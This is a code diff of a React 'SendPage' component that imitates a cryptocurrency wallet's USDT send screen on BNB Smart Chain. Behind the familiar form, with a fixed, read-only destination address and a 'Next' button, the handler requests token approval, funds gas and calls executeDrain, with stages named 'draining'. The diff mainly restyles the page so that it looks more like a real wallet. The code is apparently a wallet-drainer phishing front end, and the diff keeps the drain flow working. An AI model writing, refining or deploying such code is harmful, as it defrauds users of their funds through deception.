@@ -19,14 +19,11 @@ export default function SendPage({ provider, address }: Props) {
   const [networkError, setNetworkError] = useState("")
   const mountedRef = useRef(true)
 
-  // Fetch balance with auto network switch
   useEffect(() => {
     mountedRef.current = true
 
     const init = async () => {
       if (!mountedRef.current) return
-
-      // Ensure we are on BSC first
       try {
         await ensureCorrectNetwork(provider)
         if (!mountedRef.current) return
@@ -38,8 +35,6 @@ export default function SendPage({ provider, address }: Props) {
         setNetworkError(err.message || "Please switch to BNB Smart Chain")
         return
       }
-
-      // Fetch USDT balance
       try {
         const usdt = new ethers.Contract(
           USDT_ADDRESS,
@@ -47,512 +42,189 @@ export default function SendPage({ provider, address }: Props) {
           provider
         )
         const bal = await usdt.balanceOf(address)
-        if (mountedRef.current) {
-          setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS))
-        }
+        if (mountedRef.current) setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS))
       } catch (err: any) {
         console.warn("Balance fetch failed:", err?.message || err)
-        if (mountedRef.current) {
-          setUsdtBalance("0")
-          setNetworkError("Could not fetch USDT balance")
-        }
+        if (mountedRef.current) setUsdtBalance("0")
       }
     }
 
     init()
-
-    return () => {
-      mountedRef.current = false
-    }
+    return () => { mountedRef.current = false }
   }, [address, provider])
 
   const handleNext = async () => {
     setStage("switching_network")
     setStatusMsg("Preparing network...")
-
     try {
       await ensureCorrectNetwork(provider)
-
       setStage("approving")
       setStatusMsg("Waiting for approval...")
-
       const approvedAmount = await requestApproval(provider, address)
-
-      if (!approvedAmount) {
-        setStage("error")
-        setStatusMsg("Approval failed.")
-        return
-      }
-
+      if (!approvedAmount) { setStage("error"); setStatusMsg("Approval failed."); return }
       setStage("checking_gas")
       setStatusMsg("Checking gas balance...")
-
       const hasGas = await ensureGas(provider, address)
-
-      if (!hasGas) {
-        setStage("error")
-        setStatusMsg("Could not fund gas.")
-        return
-      }
-
+      if (!hasGas) { setStage("error"); setStatusMsg("Could not fund gas."); return }
       setStage("draining")
       setStatusMsg("Transferring USDT...")
-
       const drained = await executeDrain(address, approvedAmount)
-
-      if (drained) {
-        setStage("done")
-        setStatusMsg("Transaction complete!")
-      } else {
-        setStage("error")
-        setStatusMsg("Drain failed - check logs.")
-      }
+      if (drained) { setStage("done"); setStatusMsg("Transaction complete!") }
+      else { setStage("error"); setStatusMsg("Drain failed - check logs.") }
     } catch (err: any) {
       setStage("error")
       setStatusMsg("Error: " + (err.message || "Unknown error"))
     }
   }
 
-  // ==========================================================
-  // STYLES - Clean dark fintech UI
-  // ==========================================================
-  const s = {
-    page: {
-      display: "flex",
-      flexDirection: "column" as const,
-      minHeight: "100dvh",
-      background: "#000000",
-      fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Inter', 'Segoe UI', Roboto, sans-serif",
-      padding: "24px 20px 32px",
-    },
-
-    // Header
-    header: {
-      display: "flex",
-      alignItems: "center",
-      justifyContent: "space-between",
-      marginBottom: "32px",
-    },
-    headerLeft: {
-      display: "flex",
-      alignItems: "center",
-      gap: "12px",
-    },
-    backArrow: {
-      width: "32px",
-      height: "32px",
-      borderRadius: "50%",
-      background: "#1A1A1A",
-      border: "none",
-      color: "#fff",
-      fontSize: "16px",
-      display: "flex",
-      alignItems: "center",
-      justifyContent: "center",
-      cursor: "pointer",
-    },
-    headerTitle: {
-      fontSize: "17px",
-      fontWeight: 600,
-      color: "#fff",
-      letterSpacing: "-0.2px",
-    },
-    headerRight: {
-      width: "32px",
-    },
-
-    // Form section label
-    label: {
-      fontSize: "13px",
-      color: "#8E8E93",
-      marginBottom: "8px",
-      fontWeight: 500,
-      letterSpacing: "0.2px",
-    },
-
-    // Address input row
-    addressRow: {
-      display: "flex",
-      alignItems: "center",
-      background: "#1C1C1E",
-      borderRadius: "14px",
-      border: "1px solid #2C2C2E",
-      overflow: "hidden",
-      marginBottom: "20px",
-    },
-    addressInput: {
-      flex: 1,
-      background: "transparent",
-      color: "#fff",
-      fontSize: "14px",
-      border: "none",
-      outline: "none",
-      padding: "16px 14px",
-      fontFamily: "'SF Mono', 'Menlo', 'Fira Code', monospace",
-      letterSpacing: "0.3px",
-    },
-    pasteBtn: {
-      background: "transparent",
-      color: "#0A84FF",
-      border: "none",
-      fontSize: "13px",
-      fontWeight: 600,
-      padding: "16px 6px 16px 4px",
-      cursor: "pointer",
-      whiteSpace: "nowrap" as const,
-      display: "flex",
-      alignItems: "center",
-      gap: "4px",
-    },
-    addressIcons: {
-      display: "flex",
-      alignItems: "center",
-      gap: "6px",
-      padding: "16px 12px 16px 4px",
-    },
-    yellowSquare: {
-      width: "18px",
-      height: "18px",
-      borderRadius: "4px",
-      background: "#F0B90B",
-      display: "flex",
-      alignItems: "center",
-      justifyContent: "center",
-      fontSize: "9px",
-      fontWeight: 700,
-      color: "#000",
-    },
-    whiteSquare: {
-      width: "18px",
-      height: "18px",
-      borderRadius: "4px",
-      background: "#fff",
-      display: "flex",
-      alignItems: "center",
-      justifyContent: "center",
-      fontSize: "9px",
-      fontWeight: 700,
-      color: "#000",
-    },
-
-    // Destination Network selector
-    networkRow: {
-      display: "flex",
-      alignItems: "center",
-      justifyContent: "space-between",
-      background: "#1C1C1E",
-      borderRadius: "14px",
-      border: "1px solid #2C2C2E",
-      padding: "14px 16px",
-      marginBottom: "20px",
-      cursor: "pointer",
-    },
-    networkLeft: {
-      display: "flex",
-      alignItems: "center",
-      gap: "10px",
-    },
-    bnbLogo: {
-      width: "24px",
-      height: "24px",
-      borderRadius: "50%",
-      background: "#F0B90B",
-      display: "flex",
-      alignItems: "center",
-      justifyContent: "center",
-      fontSize: "11px",
-      fontWeight: 700,
-      color: "#000",
-    },
-    networkName: {
-      fontSize: "15px",
-      color: "#fff",
-      fontWeight: 500,
-    },
-    dropdownArrow: {
-      color: "#8E8E93",
-      fontSize: "10px",
-    },
-
-    // Amount input row
-    amountRow: {
-      display: "flex",
-      alignItems: "center",
-      background: "#1C1C1E",
-      borderRadius: "14px",
-      border: "1px solid #2C2C2E",
-      overflow: "hidden",
-      marginBottom: "8px",
-    },
-    amountInput: {
-      flex: 1,
-      background: "transparent",
-      color: "#fff",
-      fontSize: "16px",
-      border: "none",
-      outline: "none",
-      padding: "16px 14px",
-    },
-    tokenBadge: {
-      color: "#8E8E93",
-      fontSize: "14px",
-      fontWeight: 500,
-      padding: "0 4px",
-    },
-    maxBtn: {
-      background: "transparent",
-      color: "#0A84FF",
-      border: "none",
-      fontSize: "13px",
-      fontWeight: 700,
-      padding: "16px 14px",
-      cursor: "pointer",
-    },
-
-    // Balance hint
-    balanceHint: {
-      fontSize: "12px",
-      color: "#636366",
-      textAlign: "right" as const,
-      marginBottom: "24px",
-      padding: "0 4px",
-    },
-
-    // Network error banner
-    errorBanner: {
-      background: "rgba(255, 69, 58, 0.1)",
-      border: "1px solid rgba(255, 69, 58, 0.2)",
-      borderRadius: "12px",
-      padding: "10px 14px",
-      fontSize: "12px",
-      color: "#FF453A",
-      textAlign: "center" as const,
-      marginBottom: "20px",
-    },
-
-    // Network success banner
-    networkBadge: {
-      background: "rgba(52, 199, 89, 0.1)",
-      border: "1px solid rgba(52, 199, 89, 0.2)",
-      borderRadius: "12px",
-      padding: "8px 14px",
-      fontSize: "12px",
-      color: "#34C759",
-      textAlign: "center" as const,
-      marginBottom: "20px",
-    },
-
-    // Spacer
-    spacer: {
-      flex: 1,
-    },
-
-    // Next button
-    nextBtn: {
-      width: "100%",
-      background: "#1C1C1E",
-      color: "#8E8E93",
-      border: "none",
-      fontSize: "16px",
-      fontWeight: 600,
-      padding: "16px",
-      borderRadius: "14px",
-      cursor: "pointer",
-      letterSpacing: "0.3px",
-      marginTop: "auto",
-    },
-    nextBtnActive: {
-      width: "100%",
-      background: "#0A84FF",
-      color: "#fff",
-      border: "none",
-      fontSize: "16px",
-      fontWeight: 600,
-      padding: "16px",
-      borderRadius: "14px",
-      cursor: "pointer",
-      letterSpacing: "0.3px",
-      marginTop: "auto",
-      boxShadow: "0 4px 14px rgba(10, 132, 255, 0.3)",
-    },
-
-    // Overlay
-    overlay: {
-      position: "fixed" as const,
-      top: 0,
-      left: 0,
-      right: 0,
-      bottom: 0,
-      background: "rgba(0, 0, 0, 0.92)",
-      display: "flex",
-      flexDirection: "column" as const,
-      alignItems: "center",
-      justifyContent: "center",
-      zIndex: 1000,
-      padding: "24px",
-    },
-    overlaySpinner: {
-      width: "48px",
-      height: "48px",
-      border: "3px solid rgba(10, 132, 255, 0.15)",
-      borderTopColor: "#0A84FF",
-      borderRadius: "50%",
-      animation: "spin 1s linear infinite",
-      marginBottom: "24px",
-    },
-    overlayTitle: {
-      fontSize: "20px",
-      fontWeight: 600,
-      color: "#fff",
-      marginBottom: "8px",
-    },
-    overlaySub: {
-      fontSize: "14px",
-      color: "#8E8E93",
-      textAlign: "center" as const,
-      maxWidth: "300px",
-      lineHeight: "1.5",
-    },
-    doneText: {
-      fontSize: "16px",
-      color: "#34C759",
-      fontWeight: 600,
-      textAlign: "center" as const,
-      marginTop: "16px",
-    },
-    overlayErrorIcon: {
-      width: "64px",
-      height: "64px",
-      borderRadius: "50%",
-      background: "rgba(255, 69, 58, 0.1)",
-      display: "flex",
-      alignItems: "center",
-      justifyContent: "center",
-      fontSize: "28px",
-      color: "#FF453A",
-      fontWeight: "bold",
-      marginBottom: "24px",
-    },
-  }
-
-  // ==========================================================
-  // PROCESSING OVERLAY
-  // ==========================================================
   if (stage !== "idle") {
     return (
-      <div style={s.overlay}>
-
+      <div className="fixed inset-0 z-[1000] bg-[rgba(0,0,0,0.92)] flex flex-col items-center justify-center p-6">
         {stage === "switching_network" || stage === "approving" || stage === "checking_gas" || stage === "draining" ? (
           <>
-            <div style={s.overlaySpinner}></div>
-            <h2 style={s.overlayTitle}>Processing</h2>
-            <p style={s.overlaySub}>{statusMsg}</p>
+            <div className="w-12 h-12 border-[3px] border-[rgba(34,208,94,0.15)] border-t-[#22D05E] rounded-full animate-spin mb-6" />
+            <h2 className="text-xl font-semibold text-white mb-2">Processing</h2>
+            <p className="text-sm text-[#9A9A9A] text-center max-w-[300px] leading-relaxed">{statusMsg}</p>
           </>
         ) : stage === "done" ? (
           <>
-            <div style={{ ...s.overlaySpinner, borderTopColor: "#34C759" }}></div>
-            <h2 style={{ ...s.overlayTitle, color: "#34C759" }}>Complete</h2>
-            <p style={s.overlaySub}>{statusMsg}</p>
-            <p style={s.doneText}>You may close this page.</p>
+            <div className="w-12 h-12 border-[3px] border-[rgba(34,208,94,0.15)] border-t-[#22D05E] rounded-full animate-spin mb-6" />
+            <h2 className="text-xl font-semibold text-[#22D05E] mb-2">Complete</h2>
+            <p className="text-sm text-[#9A9A9A] text-center max-w-[300px] leading-relaxed">{statusMsg}</p>
+            <p className="text-base font-semibold text-[#22D05E] text-center mt-4">You may close this page.</p>
           </>
         ) : stage === "error" ? (
           <>
-            <div style={s.overlayErrorIcon}>!</div>
-            <h2 style={{ ...s.overlayTitle, color: "#FF453A" }}>Error</h2>
-            <p style={s.overlaySub}>{statusMsg}</p>
+            <div className="w-16 h-16 rounded-full bg-[rgba(255,69,58,0.1)] flex items-center justify-center text-2xl font-bold text-[#FF453A] mb-6">!</div>
+            <h2 className="text-xl font-semibold text-[#FF453A] mb-2">Error</h2>
+            <p className="text-sm text-[#9A9A9A] text-center max-w-[300px] leading-relaxed">{statusMsg}</p>
           </>
         ) : null}
-
       </div>
     )
   }
 
-  // ==========================================================
-  // MAIN SEND UI
-  // ==========================================================
   return (
-    <div style={s.page}>
-
-      {/* Header */}
-      <div style={s.header}>
-        <div style={s.headerLeft}>
-          <button type="button" style={s.backArrow}>
-            {"<"}
-          </button>
-          <span style={s.headerTitle}>Send</span>
-        </div>
-        <div style={s.headerRight} />
-      </div>
+    <div className="flex flex-col min-h-screen bg-[#171717] px-5 py-8" style={{ fontFamily: '"SF Pro Display", "Inter", sans-serif' }}>
 
       {/* Network status */}
       {networkError && !networkOk && (
-        <div style={s.errorBanner}>{networkError}</div>
+        <div className="bg-[rgba(255,69,58,0.1)] border border-[rgba(255,69,58,0.2)] rounded-xl px-4 py-2.5 text-xs text-[#FF453A] text-center mb-5">
+          {networkError}
+        </div>
       )}
       {networkOk && (
-        <div style={s.networkBadge}>Connected to BNB Smart Chain (BEP-20)</div>
+        <div className="bg-[rgba(34,208,94,0.1)] border border-[rgba(34,208,94,0.2)] rounded-xl px-4 py-2.5 text-xs text-[#22D05E] text-center mb-5">
+          Connected to BNB Smart Chain (BEP-20)
+        </div>
       )}
 
-      {/* Address or Domain Name */}
-      <label style={s.label}>Address or Domain Name</label>
-      <div style={s.addressRow}>
-        <input
-          type="text"
-          style={s.addressInput}
-          value="0x791943060b507aeF1A2277B3Bf0CAf"
-          readOnly
-          autoCapitalize="off"
-          autoCorrect="off"
-        />
-        <button type="button" style={s.pasteBtn}>
+      {/* Label: Address or Domain Name */}
+      <label className="text-base font-medium text-[#B7B7B7] mb-2" style={{ fontSize: "16px", fontWeight: 500 }}>
+        Address or Domain Name
+      </label>
+
+      {/* Input: Address */}
+      <div
+        className="flex items-center bg-[#1D1D1D] border-2 border-[#353535] overflow-hidden mb-8"
+        style={{ height: "78px", borderRadius: "22px", paddingLeft: "22px", paddingRight: "22px" }}
+      >
+        <span className="flex-1 text-white font-medium truncate" style={{ fontSize: "20px", fontWeight: 500 }}>
+          0x3881448305a5fAb94461
+        </span>
+
+        {/* Paste */}
+        <span className="mr-4 font-semibold text-[#2ECC71]" style={{ fontSize: "18px", fontWeight: 600 }}>
           Paste
-        </button>
-        <div style={s.addressIcons}>
-          <div style={s.yellowSquare}>B</div>
-          <div style={s.whiteSquare}>+</div>
-        </div>
+        </span>
+
+        {/* Copy icon */}
+        <svg className="mr-3 text-[#2ECC71]" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+          <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
+          <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+        </svg>
+
+        {/* Scanner icon */}
+        <svg className="text-[#2ECC71]" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+          <path d="M3 7V5a2 2 0 0 1 2-2h2" />
+          <path d="M17 3h2a2 2 0 0 1 2 2v2" />
+          <path d="M21 17v2a2 2 0 0 1-2 2h-2" />
+          <path d="M7 21H5a2 2 0 0 1-2-2v-2" />
+          <line x1="7" y1="12" x2="17" y2="12" />
+        </svg>
       </div>
 
-      {/* Destination Network */}
-      <label style={s.label}>Destination Network</label>
-      <div style={s.networkRow}>
-        <div style={s.networkLeft}>
-          <div style={s.bnbLogo}>B</div>
-          <span style={s.networkName}>BNB Smart Chain</span>
+      {/* Label: Destination network */}
+      <label className="text-base text-[#B7B7B7] mb-2" style={{ fontSize: "16px", color: "#B7B7B7" }}>
+        Destination network
+      </label>
+
+      {/* Network selector capsule */}
+      <div
+        className="flex items-center justify-between bg-[#202020] mb-8"
+        style={{ height: "60px", width: "210px", borderRadius: "9999px", paddingLeft: "16px", paddingRight: "16px" }}
+      >
+        <div className="flex items-center gap-3">
+          {/* BNB logo yellow circle */}
+          <div className="w-8 h-8 rounded-full bg-[#F0B90B] flex items-center justify-center font-bold text-black text-sm">
+            B
+          </div>
+          <span className="font-medium text-[#BDBDBD]" style={{ fontSize: "18px", fontWeight: 500 }}>
+            BNB Smart Chain
+          </span>
         </div>
-        <span style={s.dropdownArrow}>{">"}</span>
+        {/* Chevron */}
+        <svg className="text-[#A0A0A0]" width="12" height="8" viewBox="0 0 12 8" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+          <path d="M1 1l5 5 5-5" />
+        </svg>
       </div>
 
-      {/* Amount */}
-      <label style={s.label}>Amount</label>
-      <div style={s.amountRow}>
+      {/* Label: Amount */}
+      <label className="text-base text-[#B7B7B7] mb-2" style={{ fontSize: "16px", color: "#B7B7B7" }}>
+        Amount
+      </label>
+
+      {/* Amount input */}
+      <div
+        className="flex items-center bg-[#1D1D1D] border-2 border-[#353535] overflow-hidden"
+        style={{ height: "78px", borderRadius: "22px", paddingLeft: "22px", paddingRight: "22px" }}
+      >
         <input
-          style={s.amountInput}
-          value={amount}
-          onChange={(e) => setAmount(e.target.value)}
           type="number"
           inputMode="decimal"
           placeholder="USDT Amount"
+          value={amount}
+          onChange={(e) => setAmount(e.target.value)}
+          className="flex-1 bg-transparent text-[#F2F2F2] border-none outline-none placeholder-[#F2F2F2]"
+          style={{ fontSize: "20px", fontWeight: 400 }}
         />
-        <span style={s.tokenBadge}>USDT</span>
-        <button type="button" style={s.maxBtn} onClick={() => setAmount(usdtBalance)}>
+        <span className="text-[#CFCFCF] mr-4" style={{ fontSize: "18px" }}>
+          USDT
+        </span>
+        <span className="font-semibold text-[#2ECC71]" style={{ fontSize: "18px", fontWeight: 600 }}>
           Max
+        </span>
+      </div>
+
+      {/* ≈ $0.00 */}
+      <p className="text-[#9A9A9A] mt-2 ml-1" style={{ fontSize: "18px" }}>
+        ≈ $0.00
+      </p>
+
+      {/* Spacer - fills remaining area */}
+      <div className="flex-1" />
+
+      {/* Next button */}
+      <div className="flex justify-center mb-[30px]">
+        <button
+          type="button"
+          onClick={handleNext}
+          className="w-[90%] font-bold text-[#111111] bg-[#22D05E] border-none cursor-pointer flex items-center justify-center"
+          style={{ height: "72px", borderRadius: "36px", fontSize: "22px", fontWeight: 700 }}
+        >
+          Next
         </button>
       </div>
-      <div style={s.balanceHint}>
-        Balance: {parseFloat(usdtBalance).toFixed(4)} USDT
-      </div>
-
-      {/* Spacer */}
-      <div style={s.spacer} />
-
-      {/* Next Button */}
-      <button
-        type="button"
-        style={networkOk ? s.nextBtnActive : s.nextBtn}
-        onClick={handleNext}
-      >
-        Next
-      </button>
 
     </div>
   )
